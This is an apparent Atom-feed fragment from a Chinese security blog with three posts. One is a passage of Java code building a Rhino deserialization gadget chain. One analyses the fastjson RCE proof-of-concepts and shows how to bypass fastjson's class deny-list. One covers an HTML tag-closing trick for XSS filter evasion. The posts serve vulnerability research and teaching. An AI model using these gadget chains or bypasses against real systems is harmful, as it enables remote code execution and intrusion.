class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> Object <span class="title">generate_Object</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//构造 NativeError 对象 a</span></span><br><span class="line">    Object nativeError;</span><br><span class="line">    &#123;</span><br><span class="line">        Class&lt;?&gt; cls = Class.forName(<span class="string">"org.mozilla.javascript.NativeError"</span>);</span><br><span class="line">        Constructor&lt;?&gt; cons = cls.getDeclaredConstructor();</span><br><span class="line">        cons.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        nativeError = cons.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//构造 NativeJavaObject 对象 o</span></span><br><span class="line">    <span class="comment">//设置 o 的成员变量 javaObject 为目标对象</span></span><br><span class="line">    <span class="comment">//设置 a 的成员变量 prototypeObject 为 o</span></span><br><span class="line">    TemplatesImpl templatesImpl = TemplatesImplGadget.get();</span><br><span class="line">    &#123;</span><br><span class="line">        Context context = Context.enter();</span><br><span class="line">        NativeObject scriptableObject = (NativeObject) context.initStandardObjects();</span><br><span class="line">        NativeJavaObject nativeJavaObject = <span class="keyword">new</span> NativeJavaObject(scriptableObject, templatesImpl, TemplatesImpl.class);</span><br><span class="line">        Method method = nativeError.getClass().getMethod(<span class="string">"setPrototype"</span>, <span class="keyword">new</span> Class&lt;?&gt;[]&#123;Scriptable.class&#125;);</span><br><span class="line">        method.invoke(nativeError, <span class="keyword">new</span> Object[]&#123;nativeJavaObject&#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//构造 MemberBox 对象 m</span></span><br><span class="line">    <span class="comment">//设置 m 的成员变量 memberObject 为目标函数</span></span><br><span class="line">    <span class="comment">//构造 NativeJavaMethod 对象 n</span></span><br><span class="line">    <span class="comment">//设置 n 的成员变量 methods 的 0 号元素为 m   </span></span><br><span class="line">    <span class="comment">//通过 a 的 setGetterOrSetter() 函数，设置 a 的 getter 属性为对象 n</span></span><br><span class="line">    Method getOutputProperties = templatesImpl.getClass().getMethod(<span class="string">"getOutputProperties"</span>, <span class="keyword">new</span> Class&lt;?&gt;[<span class="number">0</span>]);</span><br><span class="line">    &#123; </span><br><span class="line">        NativeJavaMethod nativeJavaFunction = <span class="keyword">new</span> NativeJavaMethod(getOutputProperties, <span class="keyword">null</span>);</span><br><span class="line">        Method method = nativeError.getClass().getMethod(<span class="string">"setGetterOrSetter"</span>, <span class="keyword">new</span> Class&lt;?&gt;[]&#123;String.class, <span class="keyword">int</span>.class, Callable.class, <span class="keyword">boolean</span>.class&#125;);</span><br><span class="line">        method.invoke(nativeError, <span class="keyword">new</span> Object[]&#123;<span class="string">"message"</span>, <span class="number">0</span>, nativeJavaFunction, <span class="keyword">false</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//构造 MemberBox 对象 m2</span></span><br><span class="line">    <span class="comment">//设置 m2 的成员变量 memberObject 为 Context.enter()</span></span><br><span class="line">    <span class="comment">//构造 NativeJavaMethod 对象 n2</span></span><br><span class="line">    <span class="comment">//设置 n2 的成员变量 methods 的 0 号元素为 m2   </span></span><br><span class="line">    <span class="comment">//通过 a 的 setGetterOrSetter() 函数，设置 a 的 getter 属性为对象 n2</span></span><br><span class="line">    Method enterMethod = Context.class.getMethod(<span class="string">"enter"</span>, <span class="keyword">new</span> Class&lt;?&gt;[<span class="number">0</span>]);</span><br><span class="line">    &#123;</span><br><span class="line">        NativeJavaMethod nativeJavaFunction = <span class="keyword">new</span> NativeJavaMethod(enterMethod, <span class="keyword">null</span>);</span><br><span class="line">        Method method = nativeError.getClass().getMethod(<span class="string">"setGetterOrSetter"</span>, <span class="keyword">new</span> Class&lt;?&gt;[]&#123;String.class, <span class="keyword">int</span>.class, Callable.class, <span class="keyword">boolean</span>.class&#125;);</span><br><span class="line">        method.invoke(nativeError, <span class="keyword">new</span> Object[]&#123;<span class="string">"name"</span>, <span class="number">0</span>, nativeJavaFunction, <span class="keyword">false</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//通过反射强行设置 getter 属性为 MemberBox 对象的 Context.enter() 函数</span></span><br><span class="line">    &#123;</span><br><span class="line">        Method getSlot = ScriptableObject.class.getDeclaredMethod(<span class="string">"getSlot"</span>, <span class="keyword">new</span> Class&lt;?&gt;[]&#123;String.class, <span class="keyword">int</span>.class, <span class="keyword">int</span>.class&#125;);</span><br><span class="line">        getSlot.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object slot  = getSlot.invoke(nativeError, <span class="string">"name"</span>, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">        Field getter = slot.getClass().getDeclaredField(<span class="string">"getter"</span>);</span><br><span class="line">        getter.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; memberboxClass = Class.forName(<span class="string">"org.mozilla.javascript.MemberBox"</span>);</span><br><span class="line">        Constructor&lt;?&gt; memberboxClassConstructor = memberboxClass.getDeclaredConstructor(Method.class);</span><br><span class="line">        memberboxClassConstructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object memberboxes = memberboxClassConstructor.newInstance(enterMethod);</span><br><span class="line">        getter.set(slot, memberboxes);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//构造 BadAttributeValueExpException 对象 b</span></span><br><span class="line">    <span class="comment">//设置 b 的成员变量 val 为 NativeError 对象 a</span></span><br><span class="line">    BadAttributeValueExpException badAttributeValueExpException = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>); </span><br><span class="line">    &#123;</span><br><span class="line">        Field valField = badAttributeValueExpException.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">        valField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        valField.set(badAttributeValueExpException, nativeError);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> badAttributeValueExpException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用栈：</p><p><img src="/image/47-call-stack.png" alt="call-stack"></p><h2 id="四、心得"><a href="#四、心得" class="headerlink" title="四、心得"></a>四、心得</h2><p><strong>1、</strong> 有 <code>BadAttributeValueExpException</code> 作为反序列化的入口，<code>toString()</code> 也成为了 <code>readObject()</code> 之外的另一个反序列化攻击触发点。</p><p><strong>2、</strong> 反射功能，很好很强大。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;来源：&lt;a href=&quot;https://mp.weixin.qq.com/s/qm3mS78r43IIOHgZ-6YyGw&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;香依香偎@闻道解惑&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Mozilla Rhino&lt;
      
    
    </summary>
    
    
      <category term="反序列化" scheme="http://www.yaowendao.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
      <category term="Mozilla Rhino" scheme="http://www.yaowendao.com/tags/Mozilla-Rhino/"/>
    
  </entry>
  
  <entry>
    <title>fastjson 反序列化漏洞POC分析</title>
    <link href="http://www.yaowendao.com/2017/12/11/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9EPOC%E5%88%86%E6%9E%90/"/>
    <id>http://www.yaowendao.com/2017/12/11/fastjson反序列化漏洞POC分析/</id>
    <published>2017-12-10T16:00:00.000Z</published>
    <updated>2018-06-02T07:34:25.866Z</updated>
    
    <content type="html"><![CDATA[<p>来源：<a href="https://mp.weixin.qq.com/s/0a5krhX-V_yCkz-zDN5kGg" target="_blank" rel="noopener">香依香偎@闻道解惑</a></p><p><code>fastjson</code> 是阿里巴巴开源的，使用 <code>Java</code> 语言编写的 <code>JSON</code> 解析库，项目地址是 <a href="https://github.com/alibaba/fastjson" target="_blank" rel="noopener">https://github.com/alibaba/fastjson</a>，以速度快、性能高著称，使用范围非常广。</p><p>在2017年3月15日，<code>Fastjson</code> 官方主动爆出 <code>Fastjson</code> 在 1.2.24 及之前版本存在远程代码执行高危安全漏洞。本文对这个漏洞的POC进行分析。</p><h2 id="零、Fastjson-反序列化的特点"><a href="#零、Fastjson-反序列化的特点" class="headerlink" title="零、Fastjson 反序列化的特点"></a>零、<code>Fastjson</code> 反序列化的特点</h2><p>先创建一个实体类 <code>User</code>，其中包括：</p><pre><code>•    public  元素 name•    private 元素 age   和它的 setter 函数•    private 元素 prop  和它的 getter 函数•    private 元素 grade 和它的 getter 函数</code></pre><p><img src="/image/01-User.png" alt="01-User.png"></p><p>接下来使用 <code>JSON.parseObject()</code>，用指定类型的方式将这个类反序列化出来。</p><p><img src="/image/01-App.png" alt="01-App.png"></p><p>运行结果是：</p><p><img src="/image/01-result.png" alt="01-result.png"></p><p>从结果上看，我们可以得出以下结论：</p><pre><code>•    User 对象的无参构造函数被调用•    public String name 被成功的反序列化•    private int age 被成功的反序列化，它的 setter 函数被调用•    private Properties prop 被成功的反序列化，它的 getter 函数被调用•    private String grade 没有被反序列化，仍然是默认值 null，getter 函数也没有被调用</code></pre><p>前三点都自然，奇怪的是后两点。<code>prop</code> 和 <code>grade</code> 同样是 <code>private</code> 类型，同样提供了 <code>getter</code> 函数没有提供 <code>setter</code> 函数，为什么 <code>prop</code> 可以通过 <code>getter</code> 函数来反序列化，而 <code>grade</code> 却没有？</p><p>这涉及到 <code>fastjson</code> 的一个特殊处理。对于只有 <code>getter</code> 函数，没有 <code>setter</code> 函数的 <code>private</code> 元素，<code>fastjson</code> 会按如下条件判断反序列化的时候是否调用其 <code>getter</code> 函数。</p><pre><code>•    函数名称大于等于 4•    非静态函数•    函数名称以get起始，且第四个字符为大写字母•    函数没有入参•    函数的返回类型满足如下之一◦    继承自Collection◦    继承自Map◦    是AtomicBoolean◦    是AtomicInteger◦    是AtomicLong</code></pre><p><img src="/image/01-JavaBeanInfo.png" alt="01-JavaBeanInfo"></p><p>回到前面的问题。<code>prop</code> 的 <code>getter</code> 函数 <code>getProp()</code> 满足上面的条件，它的返回类型 <code>Properties</code> 继承自 <code>Map</code> ，因此可以成功的被调用。而 <code>grade</code> 的 <code>getter</code> 函数 <code>getGrade()</code> 的返回类型 <code>String</code> 不满足返回类型的那个条件，因此没有被调用，<code>grade</code> 也无法被赋值。</p><p>那么，在反序列化的时候，向 <code>grade</code> 这样无法通过 <code>setter</code> 或 <code>getter</code> 函数进行赋值的 <code>private</code> 元素，有什么方法可以赋值呢？有。就是使用 <code>FEATURE.SupportNonPublicField</code>。</p><p>在 <code>JSON.parseObject()</code> 中使用 <code>fastjson</code> 的标签 <code>FEATURE.SupportNonPublicField</code>：</p><p><img src="/image/02-App.png" alt="02-App"></p><p>执行结果是：</p><p><img src="/image/02-result.png" alt="02-result"></p><p><code>grade</code> 已经成功被反序列化，此时 <code>grade</code> 的 <code>getter</code> 函数 <code>getGrade()</code> 并没有被调用。</p><p><code>FEATURE.SupportNonPublicField</code> 从 <code>fastjson</code> 的 <code>1.2.22</code> 版本开始引入。</p><p>还有个疑问：上面的 <code>App.java</code> 中，<code>json string</code> 中使用 <code>@type</code> 标签指定了反序列化的目标类型为 <code>com.xiang.fastjson.poc.User</code>，在调用 <code>JSON.parseObject()</code> 时也指定了目标类型是 <code>User.class</code>。那如果这两个类型不一致，会发生什么？</p><p>需要说明的是，只要 <code>JSON.parseObject()</code> 的第二个参数中指定的类，与 <code>json string</code> 中 <code>@type</code> 指定的类之间存在继承或转换关系，那么这个反序列化就会成功执行。比如把 <code>JSON.parseObject()</code> 的第二个参数设为 <code>Object.class</code>（也就是所有类的基类），那么反序列化就不会因为类型不匹配而失败。如果把第二个参数设为 <code>String.class</code>，那么所有支持 <code>toString()</code> 方法的类同样可以序列化成功。</p><p>但是如果两个类之间没有关联关系，那么反序列化的时候，是会直接返回错误拒绝反序列化，还是将对象反序列化完成再进行类型转换呢？</p><p>这个答案是：不确定。比如，我们修改 <code>App.java</code>，将 <code>JSON.parseObject()</code> 的第二个参数换成 <code>Integer.class</code>，<code>json string</code> 中仍然保持 <code>com.xiang.fastjson.poc.User</code>。</p><p><img src="/image/03-App.png" alt="03-App"></p><p>执行结果是：</p><p><img src="/image/03-result.png" alt="03-result"></p><p>从结果看，<code>fastjson</code> 先按照 <code>json string</code> 中的 <code>@type</code> 将对象反序列化出来，然后再转换为 <code>JSON.parseObject()</code> 中指定的目标类型。即便两个类型不一致，<code>json string</code> 指定的对象对应的 <code>getter</code> 和 <code>setter</code> 函数也一样会被调用。</p><p>再换一下，把 <code>JSON.parseObject()</code> 的第二个参数换成 <code>ASMUtils.class</code>。</p><p><img src="/image/04-App.png" alt="04-App"></p><p>执行结果是：</p><p><img src="/image/04-result.png" alt="04-result"></p><p>这一次的结果上，<code>fastjson</code> 却首先检查了两个类型是否匹配，不匹配直接抛出异常，没有调用各个字段的方法进行反序列化操作。</p><p><code>fastjson</code> 内置了一些常用类的反序列化处理类，这些常用类的列表在 <code>ParseConfig.java</code> 中可以看到。</p><p><img src="/image/04-deserializemap.png" alt="04-deserializemap"></p><p>其中有一些处理类中（比如<code>Integer</code>、<code>BigInteger</code>等）没有检查类型是否匹配，就直接进行反序列化处理；有一些没有进行检查，但是反序列化过程会因为语法错误而失败。而对于大多数不属于常用类的情况，<code>fastjson</code> 是会进行检查不同类型之间的关联关系的（如上面的<code>ASMUtils</code>）。</p><p>好吧，这一部分太晕了。有没有更简单一些的用法，不用考虑这些匹配原则？有，就是 <code>JSON.parse()</code>。</p><p><img src="/image/05-App.png" alt="05-App"></p><p>执行结果是：</p><p><img src="/image/05-result.png" alt="05-result"></p><p>同样也支持 <code>Feature.SupportNonPublicField</code> 设置。</p><p><img src="/image/06-App.png" alt="06-App"></p><p>执行结果是：</p><p><img src="/image/06-result.png" alt="06-result"></p><p>可以看到，<code>JSON.parse()</code>，完全是按照 <code>json string</code> 中指定的类进行反序列化，不用考虑指定目标类的情况，因此可能是更广泛的用法吧。不过少了一次类型检查，也会引入更多的安全风险。</p><h2 id="一、TemplatesImpl-POC分析"><a href="#一、TemplatesImpl-POC分析" class="headerlink" title="一、TemplatesImpl POC分析"></a>一、TemplatesImpl POC分析</h2><p>首先是 <code>TemplatesImpl</code> 的 POC，来自于 <a href="http://xxlegend.com/2017/04/29/title-%20fastjson%20远程反序列化poc的构造和分析/" target="_blank" rel="noopener">廖神</a>。</p><p>这个 POC 的入口点在 <code>TemplatesImpl</code> 类中 <code>getOutputPerpeties()</code> 函数。由于 <code>TemplatesImpl</code> 的 <code>private</code> 元素 <code>_outputProperties</code> 只有 <code>getter</code> 没有 <code>setter</code> ，同时其 <code>getter</code> 函数的返回类型 <code>Properties</code> 又继承自 <code>Map</code>，因此这个 <code>getter</code> 函数 <code>getOutputProperties()</code> 满足前面说的调用条件，可以被 <code>fastjson</code> 反序列化 <code>TemplatesImpl</code> 时调用到 。POC 的调用链是：</p><ul><li>getOutputProperties() <ul><li>-&gt; newTransformer() <ul><li>-&gt; getTransletInstance() <ul><li>-&gt; defineTransletClasses()`</li></ul></li></ul></li></ul></li></ul><p><img src="/image/09-templatesimpl-01.png" alt="09-templatesimpl-01.png"></p><p><img src="/image/09-templatesimpl-02.png" alt="09-templatesimpl-02.png"></p><p><img src="/image/09-templatesimpl-03.png" alt="09-templatesimpl-03.png"></p><p><img src="/image/09-templatesimpl-04.png" alt="09-templatesimpl-04.png"></p><p>POC 代码如下：</p><p><img src="/image/07-exploit.png" alt="07-exploit.png"></p><p><img src="/image/07-poc.png" alt="07-poc.png"></p><p>执行之后成功弹出计算器：</p><p><img src="/image/07-result.png" alt="07-result.png"></p><p>上面的POC中，<code>Exploit</code> 类继承自 <code>AbstractTranslet</code>。如果不让 <code>Exploit</code> 类继承也可以，只要在 json str 中，<code>_outputProperties</code> 之前增加 <code>_transletIndex</code> 和 <code>_auxClasses</code> 的设置就好了。</p><p><img src="/image/08-exploit.png" alt="08-exploit.png"></p><p><img src="/image/08-poc.png" alt="08-poc.png"></p><p>执行之后同样弹出计算器：</p><p><img src="/image/08-result.png" alt="08-result.png"></p><p><code>TemplatesImpl</code> 的 POC，在利用的时候有几个限制：</p><ol><li>由于 POC 中关键元素 <code>_bytecode</code> 没有对应的 <code>public</code> 的 <code>getter</code> 和 <code>setter</code> 函数，因此需要服务器上解析 json 的时候，不管是使用 <code>JSON.parse()</code> 还是使用 <code>JSON.parseObject()</code>，都需要设置 <code>Feature.SupportNonPublicField</code> 。</li><li><code>Feature.SupportNonPublicField</code> 是在 1.2.22 版本引入，而这个漏洞在 1.2.25 版本就被封堵。这就要求目的服务器上的 <code>fastjson</code> 版本必须在 1.2.22 到 1.2.24 之间。</li><li>如果目的服务器使用的是 <code>JSON.parseObject()</code>，那么第二个参数必须是和 <code>TemplatesImpl</code> 不冲突的类，比如 <code>Object.class</code>，<code>String.class</code>，<code>Integer.class</code> 等。</li></ol><h2 id="二、JdbcRowSetImpl-POC分析"><a href="#二、JdbcRowSetImpl-POC分析" class="headerlink" title="二、JdbcRowSetImpl POC分析"></a>二、JdbcRowSetImpl POC分析</h2><p><code>JdbcRowSetImpl</code> 的 POC 同样来自 <a href="http://xxlegend.com/2017/12/06/基于JdbcRowSetImpl的Fastjson%20RCE%20PoC构造与分析/" target="_blank" rel="noopener">廖神</a>。</p><p><code>JdbcRowSetImpl</code> 的调用入口在 <code>setAutoCommit()</code> ，调用链很短：</p><ul><li>setAutoCommit() <ul><li>-&gt; connect() <ul><li>-&gt; InitialContext.lookup()</li></ul></li></ul></li></ul><p><img src="/image/10-JdbcRowSetImpl-01.png" alt="10-JdbcRowSetImpl-01.png"></p><p><img src="/image/10-JdbcRowSetImpl-02.png" alt="10-JdbcRowSetImpl-02.png"></p><p>需要设置的属性只有 <code>dataSourceName</code> 和 <code>autoCommit</code> 两个。由于它们的 <code>setter</code> 函数 <code>setDataSourceName()</code> 和 <code>setAutoCommit()</code> 都是 <code>public</code> 类型，因此这里 <em>不需要设置</em> <code>SupportNonPublicField</code> 属性 ，可以直接触发。</p><p>POC代码为</p><p><img src="/image/11-JdbcRowSetImpl-Poc.png" alt="11-JdbcRowSetImpl-Poc.png"></p><p>搭建好 RMI 的环境之后，执行 POC ，成功弹出计算器。</p><p><img src="/image/11-JdbcRowSetImpl-result.png" alt="11-JdbcRowSetImpl-result.png"></p><p><code>JdbcRowSetImpl</code> 的 POC，使用限制为：<br>    1    <code>fastjson</code> 的版本范围为 <code>1.2.24</code> 及以下的所有版本。<br>    2    如果目的服务器使用的是 <code>JSON.parseObject()</code>，那么第二个参数必须是和 <code>JdbcRowSetImpl</code> 不冲突的类，比如 <code>Object.class</code>，<code>String.class</code>，<code>Integer.class</code> 等。</p><h2 id="三、fastjson-的修复"><a href="#三、fastjson-的修复" class="headerlink" title="三、fastjson 的修复"></a>三、fastjson 的修复</h2><p>反序列化漏洞的修补，通常都是通过白名单或黑名单的形式，禁止具有恶意功能的类进行反序列化。<code>fastjson</code> 使用的是黑名单的方式，具体而言就是从 1.2.25 版本开始，<code>fastjson</code> 增加了两个处理：</p><ol><li><code>autotype</code> 功能默认关闭，同时提供手动 <code>enable_autotype</code> 的设置。</li><li>默认开启了黑名单，危险类所在的包不允许进行反序列化。</li></ol><p>我们将 <code>fastjson</code> 升级到最新的 1.2.41 版本，再执行上面 <code>JdbcRowSetImpl</code> 的 POC，结果是直接抛了异常：</p><p><img src="/image/12-1.2.41-autoType-close.ong.png" alt="12-1.2.41-autoType-close.ong.png"></p><p>查看抛异常的地方，</p><p><img src="/image/12-1.2.41-checkautotype.png" alt="12-1.2.41-checkautotype.png"></p><p>查看denyList的定义，可以找到目前定义的黑名单列表。</p><p><img src="/image/12-denyList.png" alt="12-denyList.png"></p><pre><code>•    bsh•    com.mchange•    com.sun.•    java.lang.Thread•    java.net.Socket•    java.rmi•    javax.xml•    org.apache.bcel•    org.apache.commons.beanutils•    org.apache.commons.collections.Transformer•    org.apache.commons.collections.functors•    org.apache.commons.collections4.comparators•    org.apache.commons.fileupload•    org.apache.myfaces.context.servlet•    org.apache.tomcat•    org.apache.wicket.util•    org.apache.xalan•    org.codehaus.groovy.runtime•    org.hibernate•    org.jboss•    org.mozilla.javascript•    org.python.core•    org.springframework</code></pre><p><code>com.sum.rowset.JdbcRowSetImpl</code> 正好符合其中的 <code>com.sun.</code> 这个黑名单前缀，因此被屏蔽。</p><h2 id="四、denyList-黑名单的绕过"><a href="#四、denyList-黑名单的绕过" class="headerlink" title="四、denyList 黑名单的绕过"></a>四、denyList 黑名单的绕过</h2><p><code>fastjson</code> 修补之后默认关闭了 <code>autoType</code> 功能，同时开启了黑名单。</p><p>但是这个黑名单功能的实现还是有问题的。在 <code>autoType</code> 功能打开的情况下（总有些偷懒的开发人员会这么干的），我们可以绕过这个黑名单的限制。</p><p>首先，我们通过命令行参数 <code>-Dfastjson.parser.autoTypeSupport=true</code> 的方式开启 <code>autoType</code> 功能，执行一下 <code>JdbcRowSetImplPoc</code>。</p><p><img src="/image/13-open-autotype.png" alt="13-open-autotype.png"></p><p>在 ParserConfig 的 880 行抛出异常。查看代码，这次是被黑名单 denyList 给拦截了。</p><p><img src="/image/13-denyList-block.png" alt="13-denyList-block.png"></p><p>继续往下看，在 926 行调用了 <code>TypeUtils.loadClass()</code> 来反序列化生成类。</p><p><img src="/image/14-TypeUtils-loadClass.png" alt="14-TypeUtils-loadClass.png"></p><p>点进去看看，在 <code>TypeUtils</code> 的 1143 行，对于类名由 <code>L</code> 和 <code>;</code> 包装的情况下，这里会直接去掉类名前后的 <code>L</code> 和 <code>;</code>，然后再 <code>loadClass()</code> ！</p><p><img src="/image/14-TypeUtils-loadClass-L.png" alt="14-TypeUtils-loadClass-L.png"></p><p>这就意味着，我们只需要将 json string 中的类名前后增加 <code>L</code> 和 <code>;</code>，也就是把 POC 中 <code>@type</code> 的值从 <code>com.sun.rowset.JdbcRowSetImpl</code> 改成 <code>Lcom.sun.rowset.JdbcRowSetImpl;</code> ，就能绕过黑名单的检查，同时也能完成 <code>JdbcRowSetImpl</code> 的反序列化！</p><p><img src="/image/15-Lcom.sun.rowset.JdbcRowSetImpl-.png" alt="15-Lcom.sun.rowset.JdbcRowSetImpl-.png"></p><p>用命令行参数 <code>-Dfastjson.parser.autoTypeSupport=true</code> 开启 <code>autoType</code> 功能，再执行一下新的 <code>JdbcRowSetImplPoc</code>。</p><p><img src="/image/15-result.png" alt="15-result.png"></p><p>成功！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;来源：&lt;a href=&quot;https://mp.weixin.qq.com/s/0a5krhX-V_yCkz-zDN5kGg&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;香依香偎@闻道解惑&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;fastjson&lt;/code&gt; 
      
    
    </summary>
    
    
      <category term="fastjson" scheme="http://www.yaowendao.com/tags/fastjson/"/>
    
      <category term="反序列化" scheme="http://www.yaowendao.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
      <category term="POC" scheme="http://www.yaowendao.com/tags/POC/"/>
    
  </entry>
  
  <entry>
    <title>闭合优先的神奇标签</title>
    <link href="http://www.yaowendao.com/2017/07/16/%E9%97%AD%E5%90%88%E4%BC%98%E5%85%88%E7%9A%84%E7%A5%9E%E5%A5%87%E6%A0%87%E7%AD%BE/"/>
    <id>http://www.yaowendao.com/2017/07/16/闭合优先的神奇标签/</id>
    <published>2017-07-15T16:00:00.000Z</published>
    <updated>2018-06-02T07:20:18.151Z</updated>
    
    <content type="html"><![CDATA[<p>来源：<a href="https://mp.weixin.qq.com/s/2Ta51yWBPiM2YVDl1mSVBw" target="_blank" rel="noopener">香依香偎@闻道解惑</a></p><h2 id="noframes"><a href="#noframes" class="headerlink" title="noframes"></a>noframes</h2><p>先看一段 HTML：</p><p><img src="/image/01-noframes-html.png" alt="01-noframes-html"></p><p>不过是展示了一张图片而已。用浏览器打开看看。</p><p><img src="/image/02-noframes-alert.png" alt="02-noframes-alert"></p><p>咦？怎么弹框了？看看浏览器处理的源码。</p><p><img src="/image/03-noframes-src.png" alt="03-noframes-src"></p><p>原来，<strong>img</strong> 标签 <strong>src</strong> 属性里的 <strong>\&lt;/noframes></strong>，跳过了 <strong>\&lt;img></strong> 标签和 <strong>src</strong> 属性，把外层的 <strong>\&lt;noframes></strong> 给闭合了，导致 <strong>src</strong> 后半部分的 <strong>script</strong> 标签被解析成了 HTML，从而触发了弹框。</p><p>这可奇怪了。<strong>\&lt;/noframes></strong> 明明在双引号里面，怎么就跨越了<strong>src</strong> 属性跨越了<strong>\&lt;img></strong> 标签，漂洋过海地把外层的 <strong>noframes</strong> 标签给闭合了？难道说，<strong>\&lt;noframes></strong> 标签有一种特殊的魔力。它的闭合优先级，高于双引号的完整性优先级，高于嵌套在内层的标签的闭合优先级。</p><p>还有其他标签也有这样的魔力么？我们 fuzz 一下看看。</p><h2 id="fuzz-找找"><a href="#fuzz-找找" class="headerlink" title="fuzz 找找"></a>fuzz 找找</h2><p>从 w3school 找到所有的 HTML 标签：</p><p><img src="/image/04-w3school-tags.png" alt="04-w3school-tags"></p><p>整理成 tags.txt。</p><p><img src="/image/05-tags-txt.png" alt="05-tags-txt"></p><p>按照前述 noframes 的格式，依次把他们输出到 show.html 中。</p><p><img src="/image/06-showtag-py.png" alt="06-showtag-py"></p><p>执行，打开 show.html 看看效果。</p><p><img src="/image/07-show-all-tag.png" alt="07-show-all-tag"></p><p>现在我们知道，这些标签都是闭合优先级高于双引号完整性优先级的特殊标签。</p><ul><li>\&lt;!–</li><li>\&lt;iframe></li><li>\&lt;noframes></li><li>\&lt;noscript></li><li>\&lt;script></li><li>\&lt;style></li><li>\&lt;textarea></li><li>\&lt;title></li><li>\&lt;xmp></li></ul><h2 id="攻击场景"><a href="#攻击场景" class="headerlink" title="攻击场景"></a>攻击场景</h2><p>这个特性出现的原因，可能是源于浏览器对 <strong>DOM</strong> 树的特殊处理。而在某些 <strong>XSS</strong> 攻击的场景下，这一特性可能导致意想不到的结果。</p><p>特别是，像邮箱或论坛等支持富文本的应用，出于防御 <strong>XSS</strong> 的考虑，一定会对用户的输入进行语法分析和检查。但是，如果语法分析的结果和浏览器的识别结果不一致的话，就会形成 <strong>XSS</strong> 的攻击点。</p><p>比如文章开头的那段 <strong>noframes</strong> 语句，如果防 <strong>XSS</strong> 引擎将 <strong>src</strong> 里的内容统一理解为 <strong>img</strong> 的 <strong>src</strong> 属性，就可能形成 <strong>XSS</strong> 攻击的入口点。</p><p>这个特性还有哪些用处，就需要你的脑洞大开了：）</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;来源：&lt;a href=&quot;https://mp.weixin.qq.com/s/2Ta51yWBPiM2YVDl1mSVBw&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;香依香偎@闻道解惑&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;noframes&quot;&gt;&lt;a href
      
    
    </summary>
    
    
      <category term="闭合优先" scheme="http://www.yaowendao.com/tags/%E9%97%AD%E5%90%88%E4%BC%98%E5%85%88/"/>
    
      <category term="HTML" scheme="http://www.yaowendao.com/tags/HTML/"/>
    
  </entry>
  
</feed>
